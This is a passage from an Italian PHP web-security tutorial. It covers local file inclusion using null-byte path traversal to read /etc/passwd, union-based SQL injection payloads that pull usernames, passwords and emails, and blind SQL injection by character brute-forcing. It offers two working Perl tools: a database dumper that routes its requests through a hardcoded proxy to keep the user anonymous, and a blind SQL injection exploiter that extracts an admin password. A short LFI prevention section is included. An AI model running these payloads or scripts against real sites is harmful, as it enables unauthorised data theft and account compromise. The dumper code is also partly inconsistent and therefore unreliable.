quindi, si scenderà di 10 directory da path. Meglio mettere sempre più `../` che meno: ho detto che file.php si trova in `/home/utente/html/file.php`. Con l'inclusione prima fatta, abbiam messo troppi `../`, in quanto ne bastavano 4 per risalire alla `/`, 4 perchè bisogna considerare che bisogna regridere di una in più per la presenza di path/ nell'inclusione. Ad ogni modo, la LFI funziona anche con più `../` di quante ne servano, anche mettendo di più infatti l'include scendendo con le cartelle si fermerà quando si troverà alla `/` .

L'inclusione quindi è diventata:
`include("/etc/passwd/dir2/file.php");`

Noi volevamo includere il file `/etc/passwd`, non  `/etc/passwd/dir2/file.php`. Ricordate nella rfi l'suo di `??` per annullare tutto quello che lo segue? Per la local file inclusion si usa il NullByte `%00`. Mettendo infatti:
`http://localhost/a.php?dir=../../../../../../../../../../etc/passwd%00`

L'inclusione diventerà:
`include("/etc/passwd");`

Il `%00` ha annullato tutto quello che lo seguiva, abbiamo sfruttato la LFI. Sullo schermo ora dovrebbe apparirci qualcosa come:
```
root:x:0:0::/root:/bin/bash
bin:x:1:1:bin:/bin:/bin/false
daemon:x:2:2:daemon:/sbin:/bin/false
adm:x:3:4:adm:/var/log:/bin/false
lp:x:4:7:lp:/var/spool/lpd:/bin/false
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/:/bin/false
news:x:9:13:news:/usr/lib/news:/bin/false
uucp:x:10:14:uucp:/var/spool/uucppublic:/bin/false
operator:x:11:0:operator:/root:/bin/bash
games:x:12:100:games:/usr/games:/bin/false
ftp:x:14:50::/home/ftp:/bin/false
smmsp:x:25:25:smmsp:/var/spool/clientmqueue:/bin/false
mysql:x:27:27:MySQL:/var/lib/mysql:/bin/false
rpc:x:32:32:RPC
portmap
user:/:/bin/false
sshd:x:33:33:sshd:/:/bin/false
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
apache:x:80:80:User for Apache:/srv/httpd:/bin/false
messagebus:x:81:81:User for D-BUS:/var/run/dbus:/bin/false
haldaemon:x:82:82:User for HAL:/var/run/hald:/bin/false
pop:x:90:90:POP:/:/bin/false
nobody:x:99:99:nobody:/:/bin/false
osirys:x:1000:100:Giovanni,,,:/home/osirys:/bin/bash
```
Questo ad esempio è il mio `/etc/passwd`. Alla fine includendo un `/etc/passwd` non si ottiene molto, in quanto le password criptate in shadow degli utenti di un server sono presenti in `/etc/shadow`, ma non abbiamo i diritti di aprire questo file, in quanto richiede diritti di root.

Ad ogni modo, una LFI, può essere meglio sfruttata con un log poisoning dei log di Apache, abbiate pazienza, questa tecnica è spiegata nel capitolo sucessivo.

Vediamo ora il perché questo esempio sia vulnerabile, e come sfruttarlo.

#### Include anticipato dalla funzione is_file()
*i.php*
```php
<?php
$a = $_GET[dir];
if (is_file("/dir/$a/file.php")) {
    include("/dir/$a/file.php");
}
?>
```

Qui c'è una condizione da oltrepassare, quella dell' `is_file`. Se infatti il file immesso non risultasse esistente, l'include non verrebbe effettuato. Quindi se il server in questione è windows, e non assegnamo ad $a il valore `../../../../../../../etc/passwd`, il file non risulterebbe esistente. Stessa cosa se il server fosse linux, e noi cercassimo di includere un file locale di windows.

Facciamo finta che il server sia linux, e che noi eseguissimo questo attacco:
`http://localhost/i.php?dir=../../../../../../../../../../../etc/passwd%00`

Il tutto risulterebbe così:
```php
if (is_file("/etc/passwd")) {
    include("/etc/passwd");
}
```
Ovviamente, trovandosi su server linux, quel file esisterà sempre. Abbiamo sfruttato la LFI, e "aggirato" la protezione `/etc/passwd`.

#### Include con variabile rappresentante il file

*i.php*
```php
<?php
//code
$dir = $_GET['lol'];
include ("path/dir2/$dir.php");
//code
?>
```

Un codice di questo tipo è vulnerabile. Il `.php` finale è privo di senso, dal momento che basterà un NullByte per annullarlo.

`http://localhost/i.php?lol=../../../../../../../../../../../../etc/passwd%00`

Dilungarsi più di tanto sulla LFI, non ha senso, in quanto è una vulnerabilità derivante come la RFI (abbondantemente spiegata nel capitolo precedente) da include di variabili non dichiarate, o provenienti da input dell'utente.
L'unica differenza sta nell'individuazione, in quanto la variabile in questione deve trovarsi tra varie cartelle oppure come file. L'exploiting poi è piuttosto facile.

### Prevenzione

Una falla Local File Inclusion è facilmente prevenibile, e dato che deriva dalla presenza di variabili non dichiarate, o provenienti da input dell'utente, proprio come per la rfi, basterà applicare gli stessi accorgimenti descritti per la rfi, escluso il filtro `is_file()`, in quanto abbiam visto come sia facilmente aggirabile.

Nonostante nella rfi sia già stato spiegato come evitare falle di questo tipo, ora vi farò un riassunto per la lfi.

Dichiarare sempre le variabili prima di includerle, in quanto se Register Globals sarà attivo, l'attacker potrà settare il valore della variabile direttamente da GET.

Filtrare opportunamente variabile proveniente da GET POST REQUEST COOKIE prima di includerle. Ecco alcuni esempi:

*1.php*
```php
<?php

$page = $_GET['pagina'];
$page = str_replace("/", "", $page);
$page = str_replace(".", "", $page);
$page = str_replace("%", "", $page);
if (is_file($page)) {
    include($page);
}

?>
```

Oltre a sostituire caratteri soliti di una LFI come `. / %` da `$page`, viene controllata anche la sua esistenza come file locale.

Vediamo qualche altro esempio:

*2.php*
```php
<?php

$page = $_GET['pagina'];
$consentite = array("template.php","login.php","view.php");

if (in_array($page,$consentite)) {
    include($page);
}

?>
```

In questo codice abbiam posto le possibili scelte dell'utente in un array, qualora la sua scelta non fosse consentita, l'inclusione non verrebbe effettuata.

# Vulnerabilità di tipo SQL Injection

Le vulnerabilità di tipo SQL Injection sono molto pericolose, in quanto permettono all'attacker di estrapolare dati sensibili dal database di cui il sito vittima è in uso. Informazioni come username, password, email, numeri di telefono e così via, insomma qualsiasi informazione sia presente nelle tabelle di un database.
L' SQLi è la vulnerabilità più diffusa nelle applicazioni web, per questo è bene approfondire per bene questa vulnerabilità.
Vedremo come trovare vulnerabilità di questo tipo da sorgente e non. A differenza di altre vulnerabilità, è piuttosto facile trovare falle di questo tipo senza aver accesso al sorgente delle pagine.

## Union-based SQL Injection

Una vulnerabilità di tipo SQL Injection è una vulnerabilità che affligge gli script PHP usanti un database SQL per memorizzare dati. La maggior parte dei siti, e dei CMS, usano i database SQL. Andiamo ora a discutere più approfonditamente di questa vulnerabilità dopo questa breve premessa.
Una query, o generalmente uno script php, è vulnerabile a SQL Injection, quando nelle query vi sono variabili provenienti direttamente dall'utente, e insufficentemente controllate. La caratteristica vera e propria di una SQL Injections, che la contraddistingue da una Blind SQL Injection, è che le rows, cioè i risultati del database, vengono stampati direttamente a schermo.
La vulnerabilità prende il nome di SQL Injection, poichè l'utente, grazie alla mancanza di controlli sulle variabili, riesce a inserire codice sql nelle richieste, che poi gli permetterà di interrogare il database a suo piacimento, ottenendo informazioni sensibili da esso.
Una SQL Injection, sottolineo, una SQL Injection normale, non blind, affligge le query di tipo select che stampano i risultati del database.
Nel linguaggio MySQL, `SELECT `appunto seleziona. Una query di tipo `SELECT` la possiamo trovare sotto questa forma:
`SELECT colonne FROM tabella;`

Ora, dopo lo statament `SELECT`, ci saranno le colonen da selezionare. Poniamo il caso che la query selezioni le colonne news,articoli, dalla tabella info, la query sarebbe:
`SELECT news,articoli FROM info;`

Volendo invece selezionare tutte le colonne della tabelle info, la query sarebbe:
`SELECT * FROM info;`

Il carattere `*` dunque corrisponde al "tutto", comporta la selezione di tutte le colonne della tabella.

Una query di questo tipo non risulta vulnerabile, in quanto all'interno di essa non vi è nulla proveniente da input diretto dell'utente, vediamo ora una query dove compare una variabile proveniente dall'input dell'utente:

Consideriamo che la pagina avente questa query sia: `ehi.php`
```php
<?php

include("config.php");
$link = mysql_connect($db,$user,$pass);

$result = mysql_query("SELECT * FROM users where USER = '".$_GET['user']."'");

while ($row = mysql_fetch_assoc($result)) {
    echo $row['firstname'];
    echo $row['lastname'];
}

// code

?>
```

In questa pagina, l'user da GET scriverà il nome di un utente, che verrà poi inviato alla query, e in caso di match, verranno stampate le relative informazioni del nickname scelto dall'attacker.
Questo è un tipico esempio di SQL Injection, in quanto una variabile proveniente direttamente da input dell'utente è posta in una query SQL, e poichè i risultati della query vengono mostrati a schermo.

Quando ci si trova di fronte a una query di questo tipo, la prima cosa da fare è quella di andare a vedere quante colonne ha la tabella scelta, in questo caso users. Se la query `SELECT` avesse selezionato un numero conosciuto di colonne, questo non sarebeb stato necessario, ma dal momento che c'è un `*`, e quindi le seleziona tutte, dobbiamo andare a vedere quante sono le colonne di users.
Una volta che abbiamo visto quante colonne ha la tabella users, poniamo il caso che siano 5:
1. firstname
2. lastname
3. user
4. password
5. email

La query `SELECT` dunque selezionerà 5 colonne, quelle sopraindicate. Ora che siamo venuti a conoscenza del numero di colonne, possiamo proseguire con l'iniezione del codice SQL.

Ovviamente, noi non siamo ineterssati a sapere il nome e il cognome dell'utente selezionato, ma vogliamo venire a conoscenza della sua password. Vediamo come:
`GET http://sito.it/cms/ehi.php?user=ciao`

La query diventa:
`SELECT * FROM users where USER = 'ciao'`

In caso di match, ovvero se esiste davvero un user che si chiama `ciao`, la query preleverà le vari rows, ovvero i risultati, e stamperà tra questi quelli corrispondenti al suo nome e cognome.

`GET http://sito.it/cms/ehi.php?user=ciao union select 1,2`

La query diventa:
`SELECT * FROM users where USER = 'ciao union select 1,2'`

Che non darebbe nessun risultato, a meno che l'user non sia davvero `ciao union select 1,2`

`GET http://sito.it/cms/ehi.php?user=ciao' union select 1,2`

A questo punto, la query risulterebbe:
`SELECT * FROM users where USER = 'ciao' union select 1,2'`

Ma sarebbe sbagliata, in quanto quando si uniscono due query di tipo select, con l'apposito `union select`, si devono selezionare sempre lo stesso numero di colonne, per questo per portare a termine l'attacco è obbligatorio sapere il numero di colonne selezionate nella prima `SELECT`. Prima abbiamo visto che sono 5: `firstname,lastname,user,password,email`

`GET http://sito.it/cms/ehi.php?user=ciao' union select 1,2,3,4,5`

La query è corretta:
`SELECT * FROM users where USER = 'ciao' union select 1,2,3,4,5`

Abbiamo appena unito due query di tipo select, la prima selezionerà tutte le colonne di users, la seconda anche. Vediamo ora come estrarre la password dell'utente `ciao`.

Poichè la query stampa le rows firstaname lastname, che sono le prime due colonne di users, dovremmo selezionare la password in questi campi affinchè vengano stampate a schermo.

`GET http://sito.it/cms/ehi.php?user=ciao' union select password,2,3,4,5`

La richiesta appena mostrata, mostrerà la password dell'utente `ciao`.

Dunque, quando si vede che è presente una variabile proveniente da input diretto dell'utente nella query, nel caso in qui la `SELECT` selezioni un numero `*` di colonne, cioè tutte le colonne della tabella, la prima cosa da fare è andare a vedere quante queste siano; se invece la `SELECT` seleziona determinate colonne, indicate dopo lo statement, basta contarle e poi selezionarle nella select della nostra sql injection.

Quando dunque, la variabile è posta tra gli apici, la SQL Injection diventa sfruttabile solo se i `Magic Quotes` sono OFF, perchè l'apice che inseriremo non verra preceduto da una backslash. In caso di `Magic Quotes` OFF, la SQL non è sfruttabile, a meno che la variabile non sia passata alla funzione `stripslashes()`, che ne eliminerà la backslash inserita dal Magic Quotes. Esaminiamo queste funzioni.

Magic Quotes è una direttiva del php, modificabile direttamente nel file di configurazione del php, il `php.ini`. Questa funzione è stata creata con l'intento di rendere il codice più sicuro, e prevenire dunque vulnerabilità in caso di programmatori non esperti in sicurezza.
La funzione esattamente ha il compito di escape dei caratteri speciali. Cioè quando i dati immessi dell'utente hanno caratteri speciali al loro interno.

Quando vi sono i seguenti caratteri: `' " \`,caratteri NULL, questi sono preceduti automaticamente con una backslash `\`, la funzione dunque fa lo stesso di `addslashes()`. La direttiva del Magic Quotes che interessa a noi è la  `magic_quotes_gpc`, che effettua i suoi controlli su tutti i dati entranti da GET,POST e COOKIE.

Altra funzione interessante, che potrebbe permettere ad un attacker una SQL Injection con all'interno caratteri speciali anche in caso di Magic Quotes ON, è `stripslashes()`. Questa funzione rimuove le backslashes precedentemente e automaticamente imposte dal Magic Quotes, quindi renderebbe l'attacco effettuabile.

Nel caso di variabili non controllate, dove il programmatore presume che abbiano contenuto solo numerico, non le porrà tra gli apici, di conseguenza la relativa SQL Injection non risentirà dell'influenza dei Magic Quotes.
Vediamone un esempio: pagina.php

```php
include("config.php");
$link = mysql_connect($db,$user,$pass);

$result = mysql_query("SELECT title,author,content FROM news where ID  = ".$_GET['id'].");

while ($row = mysql_fetch_assoc($result)) {
    echo $row['title'];
    echo $row['content'];
}

// code
```

Lo script appena visto, prende la variabile assegnata a id da GET, e la invia alla query. Poichè la colonna `ID` ha solo valori numerici, corrispondenti al numero della news, il programmatore non ha posto la variabile tra apici, perchè si aspetta che essa abbia valore strettamente numerico. Con una richiesta GET di questo tipo:
`GET http://sito.it/cms/pagina.php?id=2`

La query diventa:
`SELECT title,author,content FROM news where ID  = 2`

Dunque verranno selezionate le colonne titolo,autore,contenuto dalla tabella news aventi `id = 2`. In questo caso dunque verrà selezionato la seconda news, e ne verranno stampati il titolo e il contenuto. Come abbiam visto non vi sono apici `" ' "` su cui dover metterci mani, dunque non c'è più l'ostacolo del Magic Quotes.

La `SELECT` selezionare tre colonne, dunque la select da unire per rendere l'intera query corretta dovrà selezionare lo stesso numero di colonne. Ecco la SQL Injection:

`GET http://sito.it/cms/pagina.php?id=1 union select 1,2,3`

Poichè sappiamo che la query in caso di results, stamperà la row del titolo e del contenuto, vediamo il numero di queste nella tabella. Verremo a sapere ad esempio che le colonne di news sono (in ordine):
1. title
2. author
3. content
4. date

Poichè le colonne stampate sono title e content, corrisponderanno alla colonna 1 e alla colonna 3. Per fare una prova, proviamo questa SQL Injection che stamperà al versione del MySQL con la funzione `@@version`.

`GET http://sito.it/cms/pagina.php?id=1 and 1=2 union select @@version,2,@@version`

Vedremo stampata a schermo per due volte la versione del MYSQL del server. In questa Injection troviamo un: `and 1=2`. Questo server per rendere la prima select sempre falsa, così da evitare che vengano stampate altre info che potrebbe ofuscare ciò che noi vorremmo far stampare a schermo.

Vogliamo scoprire le password ? Poniamo il caso che il sito vulnerabile si alo stesso di prima. Sappiamo dunque che la tabella degli utenti è users, e che ha 5 colonne:
1. firstname
2. lastname
3. user
4. password
5. email

Vediamo la SQL Injection che useremo per estrarre username,password ed email di un utente.

`GET http://sito.it/cms/pagina.php?id=1 and 1=2 union select 1,2,concat(user,0x3a,password,0x3a,email) from users`

con questa Injection la query è diventata:
`SELECT title,author,content FROM news where ID  = 1 and 1=2 union select 1,2,concat(user,0x3a,password,0x3a,email) from users`

Grazie al: `and 1=2`, che rende la prima query falsa, non verranno stampate altre informazioni, solo quelle richieste da noi con la nostra iniezione di codice SQL. La union usata ci consente di unire la nostra select con quella precedente, come vediamo sono state selezionate 3 colonne: `1,2,concat(user,0x3a,password,0x3a,email)`. Il from users dice semplicemente alla query di estarre le colonne user password email dalla tabella users.
Lo statement concat permette di stampare più colonne nella stessa colonna, "concatena" dunque. Il carattere `0x3a`, è il carattere esadecimale corrispondente al carattere `:`.
Ho inserito i vari `,0x3a` in modo che si capisca la fine e l'inzio delle varie informazioni relative alle diverse colonne selezionate.
Vedremo magicamente apparire a schermo nella parte dove veniva printato il contenuto della news la seguente stringa: utente:password:email.

Facciamo finta che il primo utente del database abbia le relative info:

| user | password | email |
| --- | --- | --- |
| admin | admin | admin@sito.it |

Vedremo dunque: `admin:admin:admin@sito.it`

La password in questo caso è memorizzata nel database in modo chiaro, nella maggior parte dei casi le password sono criptate in MD5, l'algoritmo per eccellenza di cripting per informazioni memorizzate in database SQL.
Se admin fosse stat criptata in MD5, otterremmo un hash alfanumerico di 32 caratteri così: `21232f297a57a5a743894a0e4a801fc3`

Un hash MD5 non può sempre essere "craccato", in quanto convenzionalmente si usano delle grosse liste di possibili password già criptate in md5, quindi si riuscirebeb a risalire all password originaria solo se questa sia presente in questa lista.

La SQL Injection, stampa solo il primo utente dalla tabella users. Se vogliamo far si che vengano stampati tutti gli utenti della tabella, dovremmo usare il `LIMIT`. Vediamo la definizione di `LIMIT`:

> Definition: Limit is used to limit your MySQL query results to those that fall within a specified range. You can use it to show the first X number of results, or to show a range from X - Y results. It is phrased as Limit X, Y and included at the end of your query. X is the starting point (remember the first record is 0) and Y is the duration (how many records to display).

In sintesi, il limit è usato per limitare i risultati di una query a quelli specificati nel range del limit.

`LIMIT 0, 10` printa i primi dieci risultati.
`LIMIT 5, 5`  printa le colonne 6,7,8,9 e 10.

Poichè molte volte è possibile stampare solo una row per volta, ho scritto uno script che fa tutto ciò:

*sql_dump.pl*
```perl
#!/usr/bin/perl

# SQL DUMP
# di Osirys, Giovanni Buzzin

use HTTP::Request;
use LWP::UserAgent;

$max   = 10000;
$proxy = "212.93.193.72:443";

my $site_t = " union select 1,concat(0x3a6f776e65643a,,0x3a6f776e65643a),3,4,5,6 from table limit "; # Da modificare con la propria SQL Injection

print "\n--------------------------\n".
      "    SQL DUMP (Limit)        \n".
      "        by Osirys        \n".
      "--------------------------  \n\n";

&default;

$site_t =~ /http:\/\/(.+)\//;
$host = $1;
$host =~ /www\.(.+)/;
$host_ = $1;
$host_ =~ s/\///;
$fname = $host_.".txt";

print "[*] Extracting datas from: $host\n";
print "[*] Using $proxy as proxy ..\n";

&own;

open($file,">>",$fname);
foreach my $e(@data) {
    print $file "$e\n";
}
close($file);

sub own {
    while (($lim_1 <= $max)&&($stop != 1)) {
        if (($lim_1 % 1 == 0)||($lim_1 == 0)) {
            $no_ = 0;
            my $link = $site.$lim_1.",".$lim_2;
            my $re = get_req($link);
            if ($re =~ /:owned:(.+):owned:/g) {
                $no--;
                print " $1\n";
                push(@data," $1");
            }
            else {
                $lim_2++;
                $no++;
                $no_ = 1;
            }
            while ($re =~ m/:owned:(.+):owned:/g) {
                print " $1\n";
                push(@data," $1");
            }
            if ($no >= 5) {
                $stop = 1;
            }
        }
        if ($no_ != 1) {
            $lim_1++;
        }
    }
}

sub default {
    $lim_1 = 0;
    $lim_2 = 1;
    $stop  = 0;
    $no    = 0;
}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua  = LWP::UserAgent->new();
    $ua->proxy('http', "http://".$proxy);
    $ua->timeout(4);
    my $response = $ua->request($req);
    return($response->content);
}
```


L'unica modifica da fare per utilizzare lo script, è alle variabili `$site_t` e `$site_c`, dovrete inserire li la vostra SQL Injection. Lo script, pochè fa numerose richieste, usa un proxy, così restere "anonimi".
In caso di SQL Injection è possibile dunque ottenere informazioni sensibili, memorizzate nel database, oppure, si può anche arrivare a ottenere una shell di esecuzione comandi sul server, la tecnica verrà spiegata successivamente nel capitolo Remote Command Execution.

## Blind SQL Injection

Una vulnerabilità di tipo Blind SQL Injection sia ha quando una query, vulnerabile, quindi manipolabile da un utente, non stampa a schermo i risultati. Le vulnerabilità di tipo BLIND possono essere fondamentalmente di due tipi: quelle condizionali, e quelle cieche. Chiariamone melgio il concetto.

Mentre nelle SQL Injection normali, le rows, quindi i risultati della query vengono stampati a schermo, nelle blind ciò non avviene, e per sfruttarle va fatto una specie di bruteforcing. Ad ogni modo, vediamone meglio i due tipi:


*page.php*
```php
//code
$query = "SELECT id,news,author FROM news WHERE id =".$_GET[id];
$res = mysql_query($query);
$num = mysql_numrows($res);
if ($num > 0) {
    echo "<br><b>Ehi, la query ha trovato risultati<br>";
}
else {
    echo "<br><b>Ehi, la query NON ha trovato risultati<br>";
}
//code
```

Come possiamo vedere da questo spezzone di codice, `$_GET[id]` non è sanizzata, non c'è nessun check su questa variabile, l'utente dunque può manipolare la query a suo piacimento.
La differenza sostanziale, è che a questo punto, i risultati non vengono stampati a schermo, ma semplicemente, se la query ha prodotto risultati:
`if ($num > 0) {`
La query stamperà a schermo: `Ehi, la query ha trovato risultati`.

Se invece la query non ha trovato risultati, verrà stampato a schermo: `Ehi, la query NON ha trovato risultati`.

Per questo il primo tipo viene definito condizionale, perchè a schermo non vengono stampate le rows, ma determinate stringhe in base al numero di risultati ottenuti dalla query.

`GET sito.it/page.php?id=2` (Poniamo il caso che ci sia una news di id 2)

Provocherà la stampa a schermo di: `Ehi, la query ha trovato risultati`.
Poichè la query ha prodotto un numero di risultati > 0 , dunque ci troviamo nel primo IF della condizione.

`GET sito.it/page.php?id=-1`

Provocherà la stampa a schermo di: `Ehi, la query NON ha trovato risultati`
Poichè non esiste una news di `id -1`

Iniziamo ad entrare nella fase di exploitiing:

Richiesta | Risultato | Output
--- | --- | ---
`GET sito.it/page.php?id=2 and 1=1` | `and 1=1` rende la condizione sempre **VERA** | Ehi, la query ha trovato risultati
`GET sito.it/page.php?id=2 and 1=2` | `and 1=2` rende la condizione sempre **FALSA** | Ehi, la query **NON** ha trovato risultati

Dunque, se una query produce risultati, viene stampata a schermo una certa stringa, altrimenti un altra.

Entriamo ora nel concetto di bruteforcing per l'exploiting delle BLIND SQL Injection:

(Poniamo il caso che la tabella degli utenti è `users`, e le colonne che a noi interessano sono: "user","password","email")

Le funzioni che ora ci servono sono:
- `ascii()`
- `char()`
- `substring()`

La funzione `ascii()` ritorna il codice del carattere ASCII del parametro che le è stato mandato, la funzione `char()` fa esattamente l'opposto invece:

Funzione | Output
--- | ---
`ascii('a')` | 97
`char(97)`  |a

In quanto 97 è il carattere ASCII della lettera `a`

Vediamo quindi ora una specie di tabella delle corrispondenze tra caratteri normali e ASCII:

| CHAR | ASCII |
|---|---|
| a | 97  |
| b | 98  |
| c | 99  |
| d | 100 |
| e | 101 |
| f | 102 |
| g | 103 |
| h | 104 |
| i | 105 |
| j | 106 |
| k | 107 |
| l | 108 |
| m | 109 |
| n | 110 |
| o | 111 |
| p | 112 |
| q | 113 |
| r | 114 |
| s | 115 |
| t | 116 |
| u | 117 |
| v | 118 |
| w | 119 |
| x | 120 |
| y | 121 |
| z | 122 |
|..|..|
| A  | 65  |
| B  | 66  |
| .. | ..  |
| .. | ..  |
| .. | ..  |
| Z  | 90  |
| .. | .. |
| 0  | 48 |
| 1  | 49 |
| 2  | 50 |
| 3  | 51 |
| 4  | 52 |
| 5  | 53 |
| 6  | 54 |
| 7  | 55 |
| 8  | 56 |
| 9  | 57 |

Analizziamo ora la funzione `substring()`
La funzione `substring()` permette di selezionare solo alcuni caratteri da una stringa, esattamente i caratteri che corrispondo al range da noi messo:

Funzione | Output
--- | ---
`substring('ciao come va', 3)` | ao come va

Quindi s`ubstring('stringa',numero)` seleziona i caratteri di stringa a partire dal carattere di numero "numero"
Il 3o carattere di `ciao come va` è `a`, seleziona tutto a partire da quel carattere: stamperà: `ao come va`

Funzione | Output
--- | ---
`substring('ciao come va', 3,5) ` | ao co

Quindi `substring('stringa',numeroA,numeroB)` seleziona i caratteri a partire dal carattere di numero "numeroA", e i successivi "numeroB" caratteri
Il 3o carattere è `a`, e poichè il secondo range è `5`, selezionerà i prossimi 5 caratteri, incluso 'a', stamperà: `ao co`


Torniamo ora alla nostra query vulnerabile:
`SELECT id,news,author FROM news WHERE id =".$_GET[id];`

Noi vogliamo prelevare la password dell'amministratore, la password è la colonna "password", presente nella tabella "users":

`GET sito.it/page.php?id=-1 or ascii(substring((select password from users where id=1),1,1))=97`

Cosa vuol dire questa query? Esaminiamola:

Query | Risultato
--- | ---
`select password from users where id=1` | seleziona la password dalla tabella users, password dell'utente di `id = 1` (l'admin)
`substring((select password from users where id=1),1,1)` | come dire: `substring(stringa,numeroA,numeroB)` -> seleziona il primo carattere della password
`ascii(substring((select password from users where id=1),1,1))` | converte il primo carattere della password in carattere ASCII
`or ascii(substring((select password from users where id=1),1,1))=97` | pone il primo carattere della password convertito in ASCII uguale al carattere ASCII 97 (`a`)

Facciamo finta che la password dell'amministratore sia: "passwordz" . La password è dunque composta da 9 caratteri. Il bruteforce procederà in questo modo:

Inizialmente selezioneremo il primo carattere della password, lo convertiremo in carattere ASCII, e lo porremo uguale al primo carattere ASCII di una nostra lista contente tutti i caratteri ASCII di numeri e lettere

Query | Risultato
--- | ---
`select password from users where id=1` | selezionerà `passwordz`
`substring((select password from users where id=1),1,1)` | selezionerà `p` -> esaminiamo il primo carattere
`ascii(substring((select password from users where id=1),1,1))` | il carattere ascii di `p` è: 112

La lista dei caratteri ascii da confrontare col carattere selezionato della password convertito in ascii comprenderà tutti i numeri da:
97 a 122 (corrispondenti a tutte le lettere minuscole dell'alfabeto)
48 a 57  (corrispondente a tutti i numeri -> `0 1 2 3 4 5 6 7 8 9`)

Dunque la query deve inziare a capire quali sono i caratteri della password, e per farlo dovrà fare un bruteforce su ogni singolo carattere:

Query | Query spiegata | Risultato | Output
--- | --- | :---: | ---
`ascii(substring((select password from users where id=1),1,1))=97` | la prima lettera della password convertita in ascii è 112, 112 = 97  | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=98` | la prima lettera della password convertita in ascii è 112, 112 = 98  | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=99` | la prima lettera della password convertita in ascii è 112, 112 = 99  | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=100` | la prima lettera della password convertita in ascii è 112, 112 = 100 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=101` | la prima lettera della password convertita in ascii è 112, 112 = 101 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=102` | la prima lettera della password convertita in ascii è 112, 112 = 102 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=103` | la prima lettera della password convertita in ascii è 112, 112 = 103 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=104` | la prima lettera della password convertita in ascii è 112, 112 = 104 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=105` | la prima lettera della password convertita in ascii è 112, 112 = 105 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=106` | la prima lettera della password convertita in ascii è 112, 112 = 106 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=107` | la prima lettera della password convertita in ascii è 112, 112 = 107 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=108` | la prima lettera della password convertita in ascii è 112, 112 = 108 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=109` | la prima lettera della password convertita in ascii è 112, 112 = 109 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=110` | la prima lettera della password convertita in ascii è 112, 112 = 110 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=111` | la prima lettera della password convertita in ascii è 112, 112 = 111 | **FALSA** | Ehi, la query NON ha trovato risultati
`ascii(substring((select password from users where id=1),1,1))=112` | la prima lettere della password convertita in ascii è 112, 112 = 112 | **VERA** | Ehi, la query ha trovato risultati

Abbiamo appena scoperto che il primo carattere della password in ASCII è il 112 ---> la lettera `p`

Proseguiamo ora con il secondo carattere della password, la query rimarrà uguale, cambierà solamente il numeroA nel substring, poichè non dobbiamo più selezionare il primo carattere, ma il secondo:

Query | Risultato
--- | ---
`substring('stringa',1,1)` | selezionava il primo carattere
`substring('stringa',2,1) ` | seleziona il secondo carattere
`substring('stringa',3,1) ` | seleziona il terzo carattere

Dunque:

Query | Query spiegata | Risultato | Output
--- | --- | :---: | ---
`ascii(substring((select password from users where id=1),2,1))=97`  | la seconda lettera della password convertita in ascii è 97, 97 = 97 | **VERA** | Ehi, la query ha trovato risultati

Abbiamo appena scoperto che la seconda lettera della password è il carattere ASCII 97 -> la lettera `a`

Non resta dunque che continuare in questo modo, aumentando il numeroa di una unità dopo ogni volta che si ha trovato un carattere della password.

Ovviamente fare tutto questo lavoro a mano è inpensabile, ora vi fornisco uno script, che vi permetterà di estrarre dati anche con una blind sql injection 

*Exploit funzionante per le BLIND di tipo condizionale*
```perl
#!/usr/bin/perl

# BLIND SQL INJECTION EXPLOITER
# CONDITIONAL TYPE
# by Osirys

use HTTP::Request;
use LWP::UserAgent;
use URI::Escape;

my $host   =  $ARGV[0];
my $page   =  $ARGV[1];

my $select = "select password from users where id=1";
my $match  = "la query ha trovato";
my @chars  = (48..57, 97..102);
my @found  = undef;
my $rngA   = 1;

help("-1") unless (($host)&&($page));
cheek($host) == 1 || help("-2");
&banner;

for(0..32) {
    foreach my $chr(@chars) {
        my $query = " or ascii(substring((".$select."),".$rngA.",1))=".$chr;
        my $req = uri_escape($query);
        my $re = get_req($host.$page.$req);
        if ($re =~ /$match/) {
            my $char = chr($chr);
            print "[+] Found char $rngA : $chr -> $char\n";
            push(@found,$char);
            $rngA++;
        }
    }
}

if (scalar(@found) > 0) {
    print "\n[*] Bruteforce succesfully done !\n";
    my $string = join '', @found;
    print "[*] Secret string is: $string\n\n";
    exit(0);
}
else {
    print "\n[-] Bruteforcing failed !\n";
    exit(0);
}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub banner {
    print "\n".
          "  ---------------------------- \n".
          "      BLIND SQL INJECTION Ex   \n".
          "        (conditional type)     \n".
          "         Coded by Osirys       \n".
          "  ---------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad Input!\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path/ page.php?id=-2\n";
    exit(0);
}
```



 
 
## Live SQL Injection Auditing

